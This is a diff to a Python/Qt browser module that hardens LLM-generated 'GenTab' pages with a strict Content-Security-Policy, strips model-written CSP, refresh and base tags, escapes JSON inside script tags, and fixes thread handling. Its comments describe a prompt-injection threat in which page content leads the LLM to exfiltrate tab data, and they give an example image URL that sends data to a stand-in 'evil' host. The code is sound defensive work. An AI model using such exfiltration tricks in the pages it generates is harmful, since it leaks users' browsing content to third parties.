@@ -8,6 +8,7 @@ lo envía a un LLM y genera aplicaciones web interactivas personalizadas.
 
 import html as _html_escape
 import json
+import re
 import time
 import hashlib
 import requests
@@ -32,6 +33,59 @@ from constants import (
 )
 
 logger = logging.getLogger(__name__)
+
+
+# ─── CSP de las GenTabs (A-006 / A-011) ────────────────────────────────────────
+# El HTML+JS de una GenTab lo escribe un LLM a partir del contenido de las pestañas,
+# así que una inyección de prompt podría hacerle enviar ese contenido a un tercero.
+# La CSP solo deja ejecutar el JS/CSS inline del propio documento y bloquea toda
+# carga y conexión externa (fetch, XHR, WebSocket, imágenes remotas, iframes, forms).
+# img-src no admite https: a propósito: una URL de imagen remota bastaría para
+# exfiltrar datos en la query (<img src="https://evil/?d=...">). Las imágenes de las
+# páginas de origen no se mostrarán; es el precio de no tener fugas.
+GENTAB_CSP = ("default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
+              "img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; "
+              "frame-src 'none'; base-uri 'none'")
+_GENTAB_CSP_META = f'<meta http-equiv="Content-Security-Policy" content="{GENTAB_CSP}">'
+
+# Etiquetas del modelo que hay que quitar: su propia CSP (una segunda política no puede
+# relajar la nuestra, pero sí romper la página o colarse antes de ella), <base> (cambia
+# la resolución de URLs relativas) y meta refresh (redirigiría a una URL externa).
+_MODEL_META_CSP_RE = re.compile(
+    r"<meta\b[^>]*http-equiv\s*=\s*[\"']?\s*(?:content-security-policy|refresh)\b[^>]*>",
+    re.IGNORECASE)
+_MODEL_BASE_RE = re.compile(r"<base\b[^>]*>", re.IGNORECASE)
+# Inicio del documento: BOM, doctype, comentarios, <html ...> y <head ...> si están al principio.
+# La meta se inserta justo después, antes de cualquier texto o <script>: así el parser
+# la coloca siempre dentro de <head> (implícito si falta) y es su primer hijo.
+_DOC_START_RE = re.compile(
+    r"\A\ufeff?\s*(?:<!doctype[^>]*>\s*)?(?:<!--.*?-->\s*)*"
+    r"(?:<html\b[^>]*>\s*)?(?:<!--.*?-->\s*)*(?:<head\b[^>]*>)?",
+    re.IGNORECASE | re.DOTALL)
+
+
+def apply_gentab_csp(html: str) -> str:
+    """
+    Devuelve el HTML de la GenTab con la CSP restrictiva como primer elemento de <head>.
+    Quita antes cualquier meta CSP / refresh y cualquier <base> que haya escrito el modelo.
+    Es idempotente: aplicarla dos veces deja una sola meta CSP.
+    """
+    html = html or ""
+    html = _MODEL_META_CSP_RE.sub("", html)
+    html = _MODEL_BASE_RE.sub("", html)
+    m = _DOC_START_RE.match(html)
+    pos = m.end() if m else 0
+    return html[:pos] + _GENTAB_CSP_META + html[pos:]
+
+
+def json_for_script(obj) -> str:
+    """
+    json.dumps seguro para meterlo dentro de <script> (A-011): escapa "</" como "<\\/"
+    y "<!--" para que un texto de las páginas no pueda cerrar la etiqueta.
+    """
+    return (json.dumps(obj, ensure_ascii=False)
+            .replace("</", "<\\/")
+            .replace("<!--", "<\\!--"))
 
 
 class GenTabStatus(Enum):
@@ -193,13 +247,14 @@ class ContentExtractor:
 class GenTabWorker(QThread):
     """Worker thread para generar GenTabs sin bloquear la UI."""
     progress = Signal(str)
-    finished = Signal(object)
+    # GenTabResult. No se llama "finished" para no tapar QThread.finished (C-007).
+    result_ready = Signal(object)
     error = Signal(str)
 
     def __init__(self, server_url: str, prompt: str, tab_contexts: List[TabContext],
                  temperature: float = 0.7, max_tokens: int = 4000,
-                 llm_config: Optional[LLMConfig] = None):
-        super().__init__()
+                 llm_config: Optional[LLMConfig] = None, parent=None):
+        super().__init__(parent)
         self.server_url = server_url
         self.prompt = prompt
         self.tab_contexts = tab_contexts
@@ -273,6 +328,8 @@ class GenTabWorker(QThread):
                 self.progress.emit("HTML vacío. Construyendo resumen interactivo local.")
                 html = self._build_local_summary_html()
             html = self._inject_source_links(html)
+            # A-006: toda GenTab (del LLM o de los fallbacks locales) pasa por la CSP
+            html = apply_gentab_csp(html)
             if self.llm_config.provider == PROVIDER_LLMAPI:
                 model_name = self.llm_config.llmapi_model
             elif self.llm_config.provider == PROVIDER_OLLAMA:
@@ -302,11 +359,16 @@ class GenTabWorker(QThread):
                 token_count=0,
             )
 
-            self.finished.emit(result)
+            self.result_ready.emit(result)
         except LLMError as e:
             self.error.emit(str(e))
         except requests.exceptions.ConnectionError:
-            self.error.emit("No se pudo conectar al servidor LLM. Verifica que LM Studio u Ollama esté ejecutándose.")
+            from net_proxy import is_tor_active
+            if is_tor_active():
+                self.error.emit("No se pudo conectar con el proveedor de IA a través de Tor. "
+                                "Comprueba que Tor está conectado.")
+            else:
+                self.error.emit("No se pudo conectar al servidor LLM. Verifica que LM Studio u Ollama esté ejecutándose.")
         except requests.exceptions.Timeout:
             self.error.emit("Timeout: el servidor tardó demasiado en responder.")
         except Exception as e:
@@ -531,7 +593,6 @@ Start writing now. Output ONLY the HTML, starting with <!DOCTYPE html>."""
             return False
     def _build_local_summary_html(self) -> str:
         """Fallback local interactivo con búsqueda, filtros y vista grid/lista."""
-        import json as _json
         title = _html_escape.escape(self._generate_title(self.prompt or "GenTab"))
 
         items_data = []
@@ -557,7 +618,8 @@ Start writing now. Output ONLY the HTML, starting with <!DOCTYPE html>."""
                 "url": tc.url or "",
                 "excerpt": clean_text or "Sin contenido disponible.",
             })
-        items_json = _json.dumps(items_data, ensure_ascii=False)
+        # A-011: escapar "</" para que el texto de una página no cierre el <script>
+        items_json = json_for_script(items_data)
 
         return f"""<!DOCTYPE html>
 <html lang="es">
@@ -840,16 +902,36 @@ class GenTabEngine(QObject):
         if not valid:
             self.gentab_error.emit("No hay contenido extraído de las pestañas.")
             return
-        self._worker = GenTabWorker(
+        # parent=self: el QThread no se destruye mientras corre; se libera en
+        # QThread.finished (C-007).
+        worker = GenTabWorker(
             server_url, prompt, valid, temperature, max_tokens,
-            llm_config=llm_config
+            llm_config=llm_config, parent=self,
         )
-        self._worker.progress.connect(self.gentab_progress.emit)
-        self._worker.finished.connect(self._on_generation_complete)
-        self._worker.error.connect(self.gentab_error.emit)
+        self._worker = worker
+        worker.progress.connect(self.gentab_progress.emit)
+        worker.result_ready.connect(self._on_generation_complete)
+        worker.error.connect(self.gentab_error.emit)
+        worker.finished.connect(lambda w=worker: self._release_worker(w))
 
         self.gentab_started.emit()
-        self._worker.start()
+        worker.start()
+
+    def _release_worker(self, worker):
+        """Slot de QThread.finished: suelta la referencia y libera el objeto Qt."""
+        if self._worker is worker:
+            self._worker = None
+        worker.deleteLater()
+
+    def shutdown(self, timeout_ms: int = 3000):
+        """Espera al worker en curso (llamar desde closeEvent de la ventana principal)."""
+        worker = self._worker
+        if worker is not None:
+            try:
+                worker.wait(timeout_ms)
+            except RuntimeError:
+                pass
+
     def _on_generation_complete(self, result: GenTabResult):
         self.history.insert(0, result)
         if len(self.history) > 50:
